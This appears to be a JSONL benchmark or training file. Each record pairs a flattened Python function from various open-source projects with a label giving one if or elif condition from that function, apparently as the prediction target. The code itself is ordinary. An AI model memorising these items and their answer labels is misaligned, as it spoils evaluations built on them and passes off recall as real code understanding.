{"input": "def _consumer_healthy(self): abnormal_num = 0 for w in self._consumers: if not w.is_alive() and w.id not in self._consumer_endsig: abnormal_num += 1 if self._use_process: errmsg = \"consumer[{}] exit abnormally with exitcode[{}]\".format( w.pid, w.exitcode ) else: errmsg = \"consumer[{}] exit abnormally\".format(w.ident) logger.warn(errmsg) if abnormal_num > 0: logger.warn(\"{} consumers have exited abnormally!!!\".format(abnormal_num)) return abnormal_num == 0", "label": "if self . _use_process :"}
{"input": "def extract_groups(self, text: str, language_code: str): previous = None group = 1 groups = [] words = [] ignored = IGNORES.get(language_code, {}) for word in NON_WORD.split(text): if not word: continue if word not in ignored and len(word) >= 2: if previous == word: group += 1 elif group > 1: groups.append(group) words.append(previous) group = 1 previous = word if group > 1: groups.append(group) words.append(previous) return groups, words", "label": "if not word :"}
{"input": "def _validate_callbacks(cls, callbacks): for callback in callbacks: if not isinstance(callback, Callback): if issubclass(callback, Callback): raise TypeError(\"Make sure to instantiate the callbacks.\") raise TypeError(\"Only accepts a `callbacks` instance.\")", "label": "if issubclass ( callback , Callback ) :"}
{"input": "def convert_errors(from_, to, msg=None): exc = None try: yield None except from_ as e: exc = e if exc: info = \"%s: %s\" % (exc.__class__.__name__, str(exc)) if msg: info = \"%s: %s\" % (msg, info) raise to(info)", "label": "if msg :"}
{"input": "def delete_loan(loan_key, loan=None): if not loan: loan = web.ctx.site.store.get(loan_key) if not loan: raise Exception(\"Could not find store record for %s\", loan_key) loan.delete()", "label": "if not loan :"}
{"input": "def last_action_for(self, agent_id: AgentID = _DUMMY_AGENT_ID) -> EnvActionType: \"\"\"Returns the last action for the specified agent, or zeros.\"\"\" if agent_id in self._agent_to_last_action: return flatten_to_single_ndarray(self._agent_to_last_action[agent_id]) else: policy = self._policies[self.policy_for(agent_id)] flat = flatten_to_single_ndarray(policy.action_space.sample()) if hasattr(policy.action_space, \"dtype\"): return np.zeros_like(flat, dtype=policy.action_space.dtype) return np.zeros_like(flat)", "label": "if hasattr ( policy . action_space , \"dtype\" ) :"}
{"input": "def on_leave( self, original_node: CSTNodeT, updated_node: CSTNodeT ) -> Union[cst.Import, cst.ImportFrom, CSTNodeT, RemovalSentinel]: if isinstance(updated_node, cst.Import): for alias in updated_node.names: name = alias.name if isinstance(name, cst.Name) and name.value == \"b\": return cst.RemoveFromParent() elif isinstance(updated_node, cst.ImportFrom): module = updated_node.module if isinstance(module, cst.Name) and module.value == \"e\": return cst.RemoveFromParent() return updated_node", "label": "if isinstance ( module , cst . Name ) and module . value == \"e\" :"}
{"input": "def sortkey(self, r, prog=None): ret = [] for col, reverse in self._ordering: if isinstance(col, str): col = self.column(col) val = col.getTypedValue(r) ret.append(Reversor(val) if reverse else val) if prog: prog.addProgress(1) return ret", "label": "if isinstance ( col , str ) :"}
{"input": "def down_button_clicked(self, obj): ref = self.get_selected() if ref and ref[1] is not None: pos = self.find_index(ref) if pos[1] >= 0 and pos[1] < len(self.get_data()[pos[0]]) - 1: self._move_down(pos, ref[1]) elif ref and ref[1] is None: self._move_down_group(ref[0])", "label": "if pos [ 1 ] >= 0 and pos [ 1 ] < len ( self . get_data ( ) [ pos [ 0 ] ] ) - 1 :"}
{"input": "def maybe_swap_for_shadow_path(self, path: str) -> str: if not self.shadow_map: return path path = normpath(path, self.options) previously_checked = path in self.shadow_equivalence_map if not previously_checked: for source, shadow in self.shadow_map.items(): if self.fscache.samefile(path, source): self.shadow_equivalence_map[path] = shadow break else: self.shadow_equivalence_map[path] = None shadow_file = self.shadow_equivalence_map.get(path) return shadow_file if shadow_file else path", "label": "if self . fscache . samefile ( path , source ) :"}
{"input": "def _add_kid(key, x): if x is None: kids[key] = None else: if type(x) in (type([]), type(())): x1 = [i for i in x if isinstance(i, TVTKBase)] if x1: kids[key] = x1 elif isinstance(x, TVTKBase): if hasattr(x, \"__iter__\"): # Don't add iterable objects that contain non # acceptable nodes if len(list(x)) and isinstance(list(x)[0], TVTKBase): kids[key] = x else: kids[key] = x", "label": "elif isinstance ( x , TVTKBase ) :"}
{"input": "def find_zone_id(domain, client=None): paginator = client.get_paginator(\"list_hosted_zones\") zones = [] for page in paginator.paginate(): for zone in page[\"HostedZones\"]: if domain.endswith(zone[\"Name\"]) or (domain + \".\").endswith(zone[\"Name\"]): if not zone[\"Config\"][\"PrivateZone\"]: zones.append((zone[\"Name\"], zone[\"Id\"])) if not zones: raise ValueError(\"Unable to find a Route53 hosted zone for {}\".format(domain)) return zones[0][1]", "label": "if domain . endswith ( zone [ \"Name\" ] ) or ( domain + \".\" ) . endswith ( zone [ \"Name\" ] ) :"}
{"input": "def render(self, context): for condition, nodelist in self.conditions_nodelists: if condition is not None: # if / elif clause try: match = condition.eval(context) except VariableDoesNotExist: match = None else: # else clause match = True if match: return nodelist.render(context) return \"\"", "label": "if match :"}
{"input": "def init_weight(self): if self.pretrained is not None: load_entire_model(self, self.pretrained) else: for sublayer in self.sublayers(): if isinstance(sublayer, nn.Conv2D): kaiming_normal_init(sublayer.weight) elif isinstance(sublayer, (nn.BatchNorm, nn.SyncBatchNorm)): kaiming_normal_init(sublayer.weight)", "label": "if isinstance ( sublayer , nn . Conv2D ) :"}
{"input": "def _next_empty_row(view, pt): r = utils.row_at(view, pt) while True: r += 1 pt = view.text_point(r, 0) if utils.row_at(view, pt) == utils.last_row(view): return view.size(), True if view.line(pt).empty(): return pt, False", "label": "if view . line ( pt ) . empty ( ) :"}
{"input": "def __init__(self, parent, name, max_size=None, description=None): Field.__init__(self, parent, name, size=0, description=description) value = 0 addr = self.absolute_address while max_size is None or self._size < max_size: byte = parent.stream.readBits(addr, 8, LITTLE_ENDIAN) value += byte self._size += 8 if byte != 0xFF: break addr += 8 self.createValue = lambda: value", "label": "if byte != 0xFF :"}
{"input": "def xdir(obj, return_values=False): for attr in dir(obj): if attr[:2] != \"__\" and attr[-2:] != \"__\": if return_values: yield attr, getattr(obj, attr) else: yield attr", "label": "if return_values :"}
{"input": "def _extract_changes(doc_map, changes, read_time): deletes = [] adds = [] updates = [] for name, value in changes.items(): if value == ChangeType.REMOVED: if name in doc_map: deletes.append(name) elif name in doc_map: if read_time is not None: value.read_time = read_time updates.append(value) else: if read_time is not None: value.read_time = read_time adds.append(value) return (deletes, adds, updates)", "label": "elif name in doc_map :"}
{"input": "def endElement(self, name): if self._is_active is True: if name == \"record\" and self._tag_level == self._level: self._is_active = False self._tag_level = None if _callable(self._callback): self._callback(self._record) self._record = None elif self._level == self._tag_level + 1: if name != \"xref\": self._record[name] = \"\".join(self._tag_payload) self._tag_payload = None self._tag_feeding = False self._level -= 1", "label": "if name == \"record\" and self . _tag_level == self . _level :"}
{"input": "def init_worker( status_queue: multiprocessing.SimpleQueue, param_queue: multiprocessing.SimpleQueue, result_queue: multiprocessing.SimpleQueue, ) -> None: global result global coverage_run # Make sure the generator is re-seeded, as we have inherited # the seed from the parent process. random.seed() result = ChannelingTestResult(result_queue) if not param_queue.empty(): server_addr = param_queue.get() if server_addr is not None: os.environ[\"EDGEDB_TEST_CLUSTER_ADDR\"] = json.dumps(server_addr) coverage_run = devmode.CoverageConfig.start_coverage_if_requested() status_queue.put(True)", "label": "if server_addr is not None :"}
{"input": "def wait(uuid: str, kind: str, max_retries: int): \"\"\"Delete an s3 subpath.\"\"\" from polyaxon import settings from polyaxon.agents.spawners.spawner import Spawner spawner = Spawner(namespace=settings.CLIENT_CONFIG.namespace, in_cluster=True) retry = 1 while retry < max_retries: try: k8s_operation = spawner.get(run_uuid=uuid, run_kind=kind) except: # noqa k8s_operation = None if k8s_operation: retry += 1 time.sleep(retry) else: return sys.exit(1)", "label": "if k8s_operation :"}
{"input": "def _get_data_fields(): global supported_kinds ret = [] for data in supported_kinds: msg = ifinfmsg.ifinfo.data_map.get(data) if msg is not None: if getattr(msg, \"prefix\", None) is not None: ret += [msg.nla2name(i[0]) for i in msg.nla_map] else: ret += [ifinfmsg.nla2name(i[0]) for i in msg.nla_map] return ret", "label": "if getattr ( msg , \"prefix\" , None ) is not None :"}
{"input": "def loop_check(self): in_loop = [] # Add the tag for dfs check for node in self.nodes: node.dfs_loop_status = \"DFS_UNCHECKED\" # Now do the job for node in self.nodes: # Run the dfs only if the node has not been already done */ if node.dfs_loop_status == \"DFS_UNCHECKED\": self.dfs_loop_search(node) # If LOOP_INSIDE, must be returned if node.dfs_loop_status == \"DFS_LOOP_INSIDE\": in_loop.append(node) # Remove the tag for node in self.nodes: del node.dfs_loop_status return in_loop", "label": "if node . dfs_loop_status == \"DFS_UNCHECKED\" :"}
{"input": "def _find_config(args, app_desc): path = os.path.join(args.galaxy_root, app_desc.destination) if not os.path.exists(path): path = None for possible_ini_config_rel in app_desc.config_paths: possible_ini_config = os.path.join( args.galaxy_root, possible_ini_config_rel ) if os.path.exists(possible_ini_config): path = possible_ini_config if path is None: _warn(USING_SAMPLE_MESSAGE % path) path = os.path.join(args.galaxy_root, app_desc.sample_destination) return path", "label": "if os . path . exists ( possible_ini_config ) :"}
{"input": "def parseArgs(self, argv): if sys.version_info < (3, 4): # We want these options to work on all versions, emulate them. if \"-R\" in argv: argv.remove(\"-R\") self.refleak = True if \"-m\" in argv: argv.remove(\"-m\") self.multiprocess = True super(NumbaTestProgram, self).parseArgs(argv) if self.verbosity <= 0: # We aren't interested in informational messages / warnings when # running with '-q'. self.buffer = True", "label": "if \"-m\" in argv :"}
{"input": "def filter_custom_selected_callback(indices, old, new): logger.info(\"filter custom callback\") filter_label.text = \"Please Wait...\" global all_topics, apply_filter if new != [-1]: apply_filter = True selected_topics = [filter_custom_table_source.data[\"topics\"][x] for x in new] for i, line in enumerate(all_topics): if line[0] in selected_topics: all_topics[i][2] = \"1\" else: all_topics[i][2] = \"0\" filter_label.text = \"\"", "label": "if line [ 0 ] in selected_topics :"}
{"input": "def number_operators(self, a, b, skip=[]): dict = {\"a\": a, \"b\": b} for name, expr in self.binops.items(): if name not in skip: name = \"__%s__\" % name if hasattr(a, name): res = eval(expr, dict) self.binop_test(a, b, res, expr, name) for name, expr in list(self.unops.items()): if name not in skip: name = \"__%s__\" % name if hasattr(a, name): res = eval(expr, dict) self.unop_test(a, res, expr, name)", "label": "if hasattr ( a , name ) :"}
{"input": "def reader_matches(self, text): text = text[1:] matches = [] for p in self.reader_path: for k in p.keys(): if isinstance(k, string_types): if k.startswith(text): matches.append(\"#{}\".format(k)) return matches", "label": "if isinstance ( k , string_types ) :"}
{"input": "def load_templates(templates: List[JobTemplateConfig]) -> None: handlers = { TemplateSubmitHandler: build_template_func, } for handler in handlers: for name in dir(handler): if name.startswith(\"_\"): continue delattr(handler, name) for template in templates: setattr(handler, template.name, handlers[handler](template))", "label": "if name . startswith ( \"_\" ) :"}
{"input": "def scan_resource_conf(self, conf): if \"properties\" in conf: if \"supportsHttpsTrafficOnly\" in conf[\"properties\"]: if str(conf[\"properties\"][\"supportsHttpsTrafficOnly\"]).lower() == \"true\": return CheckResult.PASSED else: return CheckResult.FAILED # Use default if supportsHttpsTrafficOnly is not set if \"apiVersion\" in conf: # Default for apiVersion 2019 and newer is supportsHttpsTrafficOnly = True year = int(conf[\"apiVersion\"][0:4]) if year < 2019: return CheckResult.FAILED else: return CheckResult.PASSED return CheckResult.FAILED", "label": "if year < 2019 :"}
{"input": "def gather_failed_tests(output): if output.upper() == \"NONE\": return [] gatherer = GatherFailedTests() tests_or_tasks = \"tests or tasks\" try: suite = ExecutionResult(output, include_keywords=False).suite suite.visit(gatherer) tests_or_tasks = \"tests\" if not suite.rpa else \"tasks\" if not gatherer.tests: raise DataError(\"All %s passed.\" % tests_or_tasks) except: raise DataError( \"Collecting failed %s from '%s' failed: %s\" % (tests_or_tasks, output, get_error_message()) ) return gatherer.tests", "label": "if not gatherer . tests :"}
{"input": "def ds_leak(): print(\"Testing vlens for dataset r/w\") print(\"-----------------------------\") with h5py.File(FNAME, \"w\") as f: ds = f.create_dataset(\"dset\", (1000,), dtype=dt) for idx in range(500): # print idx if idx % 100 == 0: print_memory() ds[...] = data ds[...]", "label": "if idx % 100 == 0 :"}
{"input": "def extract_geth_traces(input, batch_size, output, max_workers): \"\"\"Extracts geth traces from JSON lines file.\"\"\" with smart_open(input, \"r\") as geth_traces_file: if input.endswith(\".json\"): traces_iterable = (json.loads(line) for line in geth_traces_file) else: traces_iterable = (trace for trace in csv.DictReader(geth_traces_file)) job = ExtractGethTracesJob( traces_iterable=traces_iterable, batch_size=batch_size, max_workers=max_workers, item_exporter=traces_item_exporter(output), ) job.run()", "label": "if input . endswith ( \".json\" ) :"}
{"input": "def save_project_as(): if PROJECT().last_save_path != None: open_dir = os.path.dirname(PROJECT().last_save_path) # We don't want to open hidden cache dir when saving file opened as autosave. if open_dir.startswith(userfolders.get_cache_dir()) == True: open_dir = expanduser(\"~\") else: open_dir = expanduser(\"~\") dialogs.save_project_as_dialog(_save_as_dialog_callback, PROJECT().name, open_dir)", "label": "if open_dir . startswith ( userfolders . get_cache_dir ( ) ) == True :"}
{"input": "def _skip_to_next_iteration_group(self): while True: if self._currkey is self._marker: pass elif self._tgtkey is self._marker: break else: if not self._tgtkey == self._currkey: break newvalue = next(self._iterator) if self._keyfunc is None: newkey = newvalue else: newkey = self._keyfunc(newvalue) self._currkey = newkey self._currvalue = newvalue", "label": "if self . _currkey is self . _marker :"}
{"input": "def extractNames(self, names): offset = names[\"offset\"].value for header in names.array(\"header\"): key = header[\"nameID\"].value foffset = offset + header[\"offset\"].value field = names.getFieldByAddress(foffset * 8) if not field or not isString(field): continue value = field.value if key not in self.NAMEID_TO_ATTR: continue key = self.NAMEID_TO_ATTR[key] if key == \"version\" and value.startswith(u\"Version \"): # \"Version 1.2\" => \"1.2\" value = value[8:] setattr(self, key, value)", "label": "if key == \"version\" and value . startswith ( u\"Version \" ) :"}
{"input": "def visit_BoolOp(self, node): for i, value in enumerate(node.values): if i == len(node.values) - 1: self.visit(value) else: self.visit(value) self.visit(node.op)", "label": "if i == len ( node . values ) - 1 :"}
{"input": "def list_sparkline_type_id_values( date_range_sparkline, correlation_type, type_id, key_id ): sparklines_value = [] for date_day in date_range_sparkline: nb_seen_this_day = r_serv_metadata.hget( \"{}:{}:{}\".format(correlation_type, type_id, date_day), key_id ) if nb_seen_this_day is None: nb_seen_this_day = 0 sparklines_value.append(int(nb_seen_this_day)) return sparklines_value", "label": "if nb_seen_this_day is None :"}
{"input": "def find_nameless_urls(self, conf): nameless = [] patterns = self.get_patterns(conf) for u in patterns: if self.has_patterns(u): nameless.extend(self.find_nameless_urls(u)) else: if u.name is None: nameless.append(u) return nameless", "label": "if u . name is None :"}
{"input": "def find_zone_id(domain, client=None): paginator = client.get_paginator(\"list_hosted_zones\") zones = [] for page in paginator.paginate(): for zone in page[\"HostedZones\"]: if domain.endswith(zone[\"Name\"]) or (domain + \".\").endswith(zone[\"Name\"]): if not zone[\"Config\"][\"PrivateZone\"]: zones.append((zone[\"Name\"], zone[\"Id\"])) if not zones: raise ValueError(\"Unable to find a Route53 hosted zone for {}\".format(domain)) return zones[0][1]", "label": "if not zone [ \"Config\" ] [ \"PrivateZone\" ] :"}
{"input": "def _lookup_reference(self, reference): if not reference.startswith(\"#/\"): return path = reference[2:].split(\"/\") pointer = self.swagger for component in path: if component not in pointer: raise IndexError( \"Can't find location by reference %r at part %r\" % (reference, component) ) pointer = pointer[component] self.log.debug(\"Found by reference %r: %r\", reference, pointer) return pointer", "label": "if component not in pointer :"}
{"input": "def read_line_from_file(ff): # assuming that ff contains BV line = b\"\" while True: vv = ff.read_data(1)[0] if vv.symbolic: break ct = bytes(chr(vv.args[0]), \"utf-8\") if ct == b\"\\n\": break line += ct return line", "label": "if ct == b\"\\n\" :"}
{"input": "def gaussian(N=1000, draw=True, show=True, seed=42, color=None, marker=\"sphere\"): \"\"\"Show N random gaussian distributed points using a scatter plot.\"\"\" import ipyvolume as ipv rng = np.random.RandomState(seed) # pylint: disable=no-member x, y, z = rng.normal(size=(3, N)) if draw: if color: mesh = ipv.scatter(x, y, z, marker=marker, color=color) else: mesh = ipv.scatter(x, y, z, marker=marker) if show: # ipv.squarelim() ipv.show() return mesh else: return x, y, z", "label": "if show :"}
{"input": "def test_read_only_directory(self): with _inside_empty_temp_dir(): oldmode = mode = os.stat(tempfile.tempdir).st_mode mode &= ~(stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH) os.chmod(tempfile.tempdir, mode) try: if os.access(tempfile.tempdir, os.W_OK): self.skipTest(\"can't set the directory read-only\") with self.assertRaises(PermissionError): self.make_temp() self.assertEqual(os.listdir(tempfile.tempdir), []) finally: os.chmod(tempfile.tempdir, oldmode)", "label": "if os . access ( tempfile . tempdir , os . W_OK ) :"}
{"input": "def is_checked_sls_template(template): if template.__contains__(\"provider\"): # Case provider is a dictionary if isinstance(template[\"provider\"], dict_node): if template[\"provider\"].get(\"name\").lower() not in SUPPORTED_PROVIDERS: return False # Case provider is direct provider name if isinstance(template[\"provider\"], str_node): if template[\"provider\"] not in SUPPORTED_PROVIDERS: return False return True return False", "label": "if isinstance ( template [ \"provider\" ] , str_node ) :"}
{"input": "def detail(self, req): resp_backup = super(BackupsController, self).detail(req) context = req.environ[\"cinder.context\"] req_version = req.api_version_request if req_version.matches(mv.BACKUP_PROJECT): if context.authorize(policy.BACKUP_ATTRIBUTES_POLICY, fatal=False): for bak in resp_backup[\"backups\"]: self._add_backup_project_attribute(req, bak) if req_version.matches(mv.BACKUP_PROJECT_USER_ID): if context.authorize(policy.BACKUP_ATTRIBUTES_POLICY, fatal=False): for bak in resp_backup[\"backups\"]: self._add_backup_user_attribute(req, bak) return resp_backup", "label": "if context . authorize ( policy . BACKUP_ATTRIBUTES_POLICY , fatal = False ) :"}
{"input": "def genConditional(self): for i in range(3): x = 0 try: if i == 2: continue x = 1 finally: for j in range(x, x + 2): yield j", "label": "if i == 2 :"}
{"input": "def _cacheAffectedBones(self): self._affectedBones = [] for f_idx in range(self.nFrames): frameData = self.getAtFramePos(f_idx) self._affectedBones.append([]) for b_idx in range(self.nBones): if not isRest(frameData[b_idx]): self._affectedBones[f_idx].append(b_idx)", "label": "if not isRest ( frameData [ b_idx ] ) :"}
{"input": "def load_metrics(self, filename, config_dict): # we don't try to validate metrics keys if \"metrics\" in config_dict: metrics = config_dict[\"metrics\"] if not isinstance(metrics, dict): error(\"c['metrics'] must be a dictionary\") else: self.metrics = metrics", "label": "if not isinstance ( metrics , dict ) :"}
{"input": "def _decode_list_response(response: Iterable[Any], decode: bool) -> Any: if decode is True: new_response = [] for val in response: if isinstance(val, bytes): val = val.decode(\"utf-8\") new_response.append(val) return new_response return response", "label": "if isinstance ( val , bytes ) :"}
{"input": "def _np_convert_in_place(d): \"\"\"Convert any jax devicearray leaves to numpy arrays in place.\"\"\" if isinstance(d, dict): for k, v in d.items(): if isinstance(v, jax.xla.DeviceArray): d[k] = np.array(v) elif isinstance(v, dict): _np_convert_in_place(v) elif isinstance(d, jax.xla.DeviceArray): return np.array(d) return d", "label": "if isinstance ( v , jax . xla . DeviceArray ) :"}
{"input": "def reader(): with tarfile.open(filename, mode=\"r\") as f: names = (each_item.name for each_item in f if sub_name in each_item.name) while True: for name in names: if six.PY2: batch = pickle.load(f.extractfile(name)) else: batch = pickle.load(f.extractfile(name), encoding=\"bytes\") for item in read_batch(batch): yield item if not cycle: break", "label": "if six . PY2 :"}
{"input": "def _Determine_Do(self): self.applicable = 1 method = \"moz-src\" method_arg = None for opt, optarg in self.chosenOptions: if opt == \"--moz-src\": method = \"moz-src\" elif opt == \"--moz-objdir\": method = \"moz-objdir\" method_arg = optarg if method == \"moz-src\": self.value = self._get_mozilla_objdir() elif method == \"moz-objdir\": self.value = self._use_mozilla_objdir(method_arg) else: raise black.configure.ConfigureError(\"bogus method: %r\" % method) self.determined = 1", "label": "elif opt == \"--moz-objdir\" :"}
{"input": "def close_all(map=None, ignore_all=False): if map is None: # pragma: no cover map = socket_map for x in list(map.values()): # list() FBO py3 try: x.close() except OSError as x: if x.args[0] == EBADF: pass elif not ignore_all: raise except _reraised_exceptions: raise except: if not ignore_all: raise map.clear()", "label": "elif not ignore_all :"}
{"input": "def _attributes_to_xml(self, xml_element, prefix_root, debug_context=None): del debug_context # Unused. for attribute_name, attribute in six.iteritems(self._attributes): attribute_value = attribute.to_xml_string(prefix_root) if attribute_name == self._spec.identifier and attribute_value is None: xml_element.set(attribute_name, self.full_identifier) elif attribute_value is None: continue else: xml_element.set(attribute_name, attribute_value)", "label": "if attribute_name == self . _spec . identifier and attribute_value is None :"}
{"input": "def parse(s): \"\"\"Parse the output below to create a new StopWatch.\"\"\" stopwatch = StopWatch() for line in s.splitlines(): if line.strip(): parts = line.split(None) name = parts[0] if name != \"%\": # ie not the header line rest = (float(v) for v in parts[2:]) stopwatch.times[parts[0]].merge(Stat.build(*rest)) return stopwatch", "label": "if name != \"%\" :"}
{"input": "def reverse_adjust_line_according_to_hunks(self, hunks, line): for hunk in reversed(hunks): head_start = hunk.head_start saved_start = hunk.saved_start if hunk.saved_length == 0: saved_start += 1 elif hunk.head_length == 0: saved_start -= 1 head_end = head_start + hunk.head_length saved_end = saved_start + hunk.saved_length if saved_end <= line: return head_end + line - saved_end elif saved_start <= line: return head_start # fails to find matching return line", "label": "elif hunk . head_length == 0 :"}
{"input": "def add(self, *args): self._digest = None llt = Hasher.list_like_types for arg in args: t = type(arg) if t in llt: self._hasher.update(bytes(f\"{llt[t]} {len(arg)}\", \"utf8\")) self.add(*arg) else: self._hasher.update(bytes(str(arg), \"utf8\"))", "label": "if t in llt :"}
{"input": "def filter(self, qs, value): if value: if value.start is not None and value.stop is not None: value = (value.start, value.stop) elif value.start is not None: self.lookup_expr = \"startswith\" value = value.start elif value.stop is not None: self.lookup_expr = \"endswith\" value = value.stop return super().filter(qs, value)", "label": "elif value . start is not None :"}
{"input": "def _getResourceData(self, jid, dataname): \"\"\"Return specific jid's resource representation in internal format. Used internally.\"\"\" if jid.find(\"/\") + 1: jid, resource = jid.split(\"/\", 1) if self._data[jid][\"resources\"].has_key(resource): return self._data[jid][\"resources\"][resource][dataname] elif self._data[jid][\"resources\"].keys(): lastpri = -129 for r in self._data[jid][\"resources\"].keys(): if int(self._data[jid][\"resources\"][r][\"priority\"]) > lastpri: resource, lastpri = r, int(self._data[jid][\"resources\"][r][\"priority\"]) return self._data[jid][\"resources\"][resource][dataname]", "label": "if int ( self . _data [ jid ] [ \"resources\" ] [ r ] [ \"priority\" ] ) > lastpri :"}
{"input": "def OnGetText(self, node_id): try: ea, rows = self[node_id] if ea in self.colours: colour = self.colours[ea] else: colour = 0xFFFFFF ret = [] for row in rows: ret.append(row[2]) label = \"\\n\".join(ret) return (label, colour) except: print(\"GraphViewer.OnGetText:\", sys.exc_info()[1]) return (\"ERROR\", 0x000000)", "label": "if ea in self . colours :"}
{"input": "def _apply_scales(array, scales, dtype): \"\"\"Apply scales to the array.\"\"\" new_array = np.empty(array.shape, dtype) for i in array.dtype.names: try: new_array[i] = array[i] * scales[i] except TypeError: if np.all(scales[i] == 1): new_array[i] = array[i] else: raise return new_array", "label": "if np . all ( scales [ i ] == 1 ) :"}
{"input": "def run(self): self.running = True while self.running: errCode, bytes, key, overlapped = GetQueuedCompletionStatus( self.io_req_port, INFINITE ) if key == ISAPI_SHUTDOWN and overlapped is None: break # Let the parent extension handle the command. dispatcher = self.extension.dispatch_map.get(key) if dispatcher is None: raise RuntimeError(\"Bad request '%s'\" % (key,)) dispatcher(errCode, bytes, key, overlapped)", "label": "if dispatcher is None :"}
{"input": "def on_task_filter(self, task, config): if task.options.learn: log.info(\"Plugin limit_new is disabled with --learn\") return amount = config for index, entry in enumerate(task.accepted): if index < amount: log.verbose(\"Allowed %s (%s)\" % (entry[\"title\"], entry[\"url\"])) else: entry.reject(\"limit exceeded\") # Also save this in backlog so that it can be accepted next time. plugin.get(\"backlog\", self).add_backlog(task, entry) log.debug( \"Rejected: %s Allowed: %s\" % (len(task.accepted[amount:]), len(task.accepted[:amount])) )", "label": "if index < amount :"}
{"input": "def initialize_pairs(self): # White on Black is fixed as color_pair 0 self._defined_pairs[\"WHITE_BLACK\"] = (0, curses.COLOR_WHITE, curses.COLOR_BLACK) for cp in self.__class__._colors_to_define: if cp[0] == \"WHITE_BLACK\": # silently protect the user from breaking things. continue self.initalize_pair(cp[0], cp[1], cp[2])", "label": "if cp [ 0 ] == \"WHITE_BLACK\" :"}
{"input": "def get_story_task_body(payload: Dict[str, Any], action: str) -> str: primary_action = get_action_with_primary_id(payload) kwargs = { \"task_description\": primary_action[\"description\"], \"action\": action, } for a in payload[\"actions\"]: if a[\"entity_type\"] == \"story\": kwargs[\"name_template\"] = STORY_NAME_TEMPLATE.format( name=a[\"name\"], app_url=a[\"app_url\"], ) return STORY_TASK_TEMPLATE.format(**kwargs)", "label": "if a [ \"entity_type\" ] == \"story\" :"}
{"input": "def _key_remap(key, keys, item): elements_list = [] for r_item in item.get(key, []): element = {} for r_outkey, r_inkey in six.iteritems(keys): if r_inkey in r_item: element[r_outkey] = r_item.get(r_inkey) elements_list.append(element) return elements_list", "label": "if r_inkey in r_item :"}
{"input": "def fix_identities(self, uniq=None): \"\"\"Make pattern-tree tips point to same object if they are equal.\"\"\" if not hasattr(self, \"children\"): return self uniq = list(set(self.flat())) if uniq is None else uniq for i, c in enumerate(self.children): if not hasattr(c, \"children\"): assert c in uniq self.children[i] = uniq[uniq.index(c)] else: c.fix_identities(uniq)", "label": "if not hasattr ( c , \"children\" ) :"}
{"input": "def _apply_main_args(main_args, exec_args): i = 0 while i < len(exec_args): if exec_args[i] == \"${main_args}\": exec_args[i : i + 1] = main_args i += len(main_args) i += 1", "label": "if exec_args [ i ] == \"${main_args}\" :"}
{"input": "def _clean_text(self, text): \"\"\"Performs invalid character removal and whitespace cleanup on text.\"\"\" output = [] char_idx = [] for i, char in enumerate(text): cp = ord(char) if cp == 0 or cp == 0xFFFD or _is_control(char): continue if _is_whitespace(char): output.append(\" \") char_idx.append(i) else: output.append(char) char_idx.append(i) return \"\".join(output), char_idx", "label": "if cp == 0 or cp == 0xFFFD or _is_control ( char ) :"}
{"input": "def upgrade_state_dict_named(self, state_dict, name): prefix = name + \".\" if name != \"\" else \"\" for k, v in state_dict.items(): if k.endswith(prefix + \"weight\"): if v.dim() == 3 and v.size(1) == 1: state_dict[k] = v.squeeze(1)", "label": "if v . dim ( ) == 3 and v . size ( 1 ) == 1 :"}
{"input": "def fetch_with_retry(self): for i in range(self.max_retries): try: self.is_truncated, self.next_marker = self._fetch() except ServerError as e: if e.status // 100 != 5: raise if i == self.max_retries - 1: raise else: return", "label": "if e . status // 100 != 5 :"}
{"input": "def hg_hook(ui, repo, node=None, **kwargs): \"\"\"Run pylama after mercurial commit.\"\"\" seen = set() paths = [] if len(repo): for rev in range(repo[node], len(repo)): for file_ in repo[rev].files(): file_ = op.join(repo.root, file_) if file_ in seen or not op.exists(file_): continue seen.add(file_) paths.append(file_) options = parse_options() setup_logger(options) if paths: process_paths(options, candidates=paths)", "label": "if file_ in seen or not op . exists ( file_ ) :"}
{"input": "def test_playlist_items(self): playlists = self.spotify.user_playlists(self.username, limit=5) self.assertTrue(\"items\" in playlists) for playlist in playlists[\"items\"]: if playlist[\"uri\"] != self.new_playlist_uri: continue pid = playlist[\"id\"] results = self.spotify.playlist_items(pid) self.assertEqual(len(results[\"items\"]), 0)", "label": "if playlist [ \"uri\" ] != self . new_playlist_uri :"}
{"input": "def update_execute_option_setting( css_selector_of_option_status, css_selector_of_option ): retry = 3 check_status = self.driver.find_element_by_css_selector( css_selector_of_option_status ) if \"visibility-hidden\" not in check_status.get_attribute(\"class\"): while retry > 0: self.find_by_css_selector(css_selector_of_option).click() time.sleep(0.2) if \"visibility-hidden\" in check_status.get_attribute(\"class\"): break else: retry -= 1", "label": "if \"visibility-hidden\" in check_status . get_attribute ( \"class\" ) :"}
{"input": "def _validate_config(self): # convert comma separated strings to lists (ConfigParser) for item in [\"to\", \"cc\", \"bcc\"]: if item in self.app.config.keys(self._meta.config_section): value = self.app.config.get(self._meta.config_section, item) # convert a comma-separated string to a list if type(value) is str: value_list = value.split(\",\") # clean up extra space if they had it inbetween commas value_list = [x.strip() for x in value_list] # set the new extensions value in the config self.app.config.set(self._meta.config_section, item, value_list)", "label": "if type ( value ) is str :"}
{"input": "def cell_func(combo, render, model, iter_, *args): value = model.get_value(iter_) if value is None: text = escape(_(\"System Default\")) else: if value == u\"C\": value = u\"en\" text = \"%s <span weight='light'>(%s)</span>\" % ( escape(value), escape(iso639.translate(value.split(\"_\", 1)[0])), ) render.set_property(\"markup\", text)", "label": "if value == u\"C\" :"}
{"input": "def _get_all_tasks(): proc = Popen([\"yarn\", \"--help\"], stdout=PIPE) should_yield = False for line in proc.stdout.readlines(): line = line.decode().strip() if \"Commands:\" in line: should_yield = True continue if should_yield and \"- \" in line: yield line.split(\" \")[-1]", "label": "if should_yield and \"- \" in line :"}
{"input": "def _staged_model_references(self, load_relationships=False): for name, field in self._fields.items(): if isinstance(field, BaseRelationship): try: if load_relationships: value = getattr(self, name) else: value = self.data_store.get(name, (\"staged\", \"committed\")) except (AttributeError, KeyError, PathResolutionError): continue if value is None: continue if not isinstance(value, ModelCollection): value = [value] for related in value: related_name = field.related_name yield related, related_name", "label": "if not isinstance ( value , ModelCollection ) :"}
